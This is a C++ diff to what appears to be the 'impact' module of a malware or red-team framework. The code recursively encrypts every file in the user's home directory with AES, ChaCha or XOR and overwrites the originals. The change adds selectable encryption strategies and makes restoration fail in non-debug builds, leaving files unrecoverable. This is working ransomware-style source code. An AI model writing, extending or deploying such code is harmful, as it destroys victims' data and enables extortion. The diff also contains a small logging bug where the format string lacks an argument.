@@ -1,13 +1,28 @@
 #include "modules/impact/Encryption.hpp"
+#include "modules/impact/EncryptionStrategies.hpp"
 #include "utils/Logger.hpp"
 #include "utils/CryptoUtils.hpp"
 #include "utils/FileUtils.hpp"
 #include "utils/SystemUtils.hpp"
 #include "core/Config.hpp"
 
-bool EncryptionMethod::trigger() {
+EncryptionMethod::EncryptionMethod() {
+    #if defined(ALGO_AES)
+        strategy = std::make_unique<AesEncryptionStrategy>();
+        LOG_INFO("Encryption initialized with AES strategy")
+    #elif defined(ALGO_CHACHA)
+        strategy = std::make_unique<ChaChaEncryptionStrategy>();
+        LOG_INFO("Encryption initialized with CHACHA strategy")
+    #else
+        strategy = std::make_unique<XorEncryptionStrategy>();
+        LOG_INFO("Encryption initialized with XOR strategy")
+    #endif
+}
+
+void EncryptionMethod::applyCrypto(bool encrypt) {
     std::string targetDir = SystemUtils::GetUserHome();
-    LOG_INFO("Encrypting files in {}", targetDir)
+    std::string action = encrypt ? "Encrypting" : "Restoring";
+    LOG_INFO("{} files in {}", targetDir)
 
     auto files = FileUtils::ListFilesRecursively(targetDir);
     int successCount = 0;
@@ -17,10 +32,15 @@ bool EncryptionMethod::trigger() {
             std::string content = FileUtils::ReadFile(filePath);
             if (content.empty()) continue;
 
-            std::string encrypted = CryptoUtils::XorEncrypt(content, Config::ENCRYPTION_KEY);
+            std::string processed = encrypt ? strategy->encrypt(content, Config::ENCRYPTION_KEY) : strategy->decrypt(content, Config::ENCRYPTION_KEY);
 
-            if (FileUtils::WriteFile(filePath, encrypted)) {
-                LOG_INFO("Encrypted {}", filePath)
+            if (!encrypt && processed.empty() && !content.empty()) {
+                LOG_ERROR("Decryption resulted in empty content for {}", filePath);
+                continue;
+            }
+
+            if (FileUtils::WriteFile(filePath, processed)) {
+                LOG_INFO("{} {}", (encrypt ? "Encrypted" : "Decrypted"), filePath)
                 successCount++;
             }
         } catch (const std::exception& e) {
@@ -28,10 +48,19 @@ bool EncryptionMethod::trigger() {
         }
     }
     LOG_SUCCESS("Encryption summary: encrypted {} files", successCount)
+}
 
+bool EncryptionMethod::trigger() {
+    applyCrypto(true);
     return true;
 }
 
 bool EncryptionMethod::restore() {
-    return trigger();
+    #ifdef DEBUG_MODE
+        applyCrypto(false);
+        return true;
+    #else
+        LOG_ALERT("Restoration disabled in non-debug builds")
+        return false;
+    #endif
 }
